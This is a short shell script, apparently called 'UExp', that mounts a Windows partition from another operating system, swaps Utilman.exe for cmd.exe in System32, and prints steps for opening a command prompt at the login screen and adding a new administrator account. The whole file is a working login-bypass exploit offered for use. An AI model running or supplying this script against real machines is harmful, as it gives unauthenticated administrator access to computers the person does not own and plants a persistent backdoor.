mkdir /media/windows
sudo mount -t ntfs-3g -o uid=1000,gid=1000,dmask=002,fmask=111 /dev/sda3 /media/windows
cd /media/windows/Windows/System32/
mv Utilman.exe Utilman.exe.bak
cp cmd.exe Utilman.exe
echo "---------------------------------------------------------------"
echo "Performed Utilman.exe exploit! Please boot back into windows"
echo "When prompted to enter the password push WinKey + U to open cmd"
echo "-> To create an admin account use the following commands:"
echo "net user Username YourPassword /add"
echo "net localgroup Administrators Username /add"
echo "-> To delete an account use the following commands:"
echo "net user Username /delete"
echo "Thank you for using UExp"
echo "---------------------------------------------------------------"
